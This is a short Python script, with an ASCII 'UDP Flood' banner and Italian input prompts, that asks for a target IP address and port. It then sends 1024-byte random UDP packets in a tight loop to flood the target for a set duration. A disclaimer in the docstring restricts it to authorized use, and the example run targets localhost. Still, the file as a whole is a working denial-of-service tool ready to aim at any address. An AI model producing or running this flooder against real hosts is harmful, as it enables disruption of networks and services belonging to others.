import socket
import random
import time

print(f"""
         ___  ___     ___ _                 _ 
 /\ /\  /   \/ _ \   / __\ | ___   ___   __| |
/ / \ \/ /\ / /_)/  / _\ | |/ _ \ / _ \ / _` |
\ \_/ / /_// ___/  / /   | | (_) | (_) | (_| |
 \___/___,'\/      \/    |_|\___/ \___/ \__,_|
\n                                              
""")

target_ip = input("Inserire Indirizzo IP bersaglio: \n")
target_port = input("Inserire porta bersaglio: \n")


def udp_flood(target_ip, target_port, duration=10):
    """
    Sends UDP packets to the target IP and port to simulate a UDP flood.
    Only use this in an authorized and controlled environment.
    
    Args:
    - target_ip: str, The IP address of the target.
    - target_port: int, The port on the target machine to send packets to.
    - duration: int, How many seconds to continue the flood.
    """
    
    # Initialize a UDP socket
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate random packet data
    bytes_to_send = random._urandom(1024)  # Send 1024 random bytes per packet
    
    # Track the end time
    end_time = time.time() + duration
    
    # Flood loop
    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
    while time.time() < end_time:
        try:
            # Send a packet to the target IP and port
            client.sendto(bytes_to_send, (target_ip, target_port))
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    
    print("UDP flood completed.")

# Example usage
if __name__ == "__main__":
    # Set target IP, port, and duration
    target_ip = "127.0.0.1"   # Localhost for safe testing
    target_port = 80          # Choose an open port on the target
    duration = 5              # Set flood duration in seconds

    udp_flood(target_ip, target_port, duration)
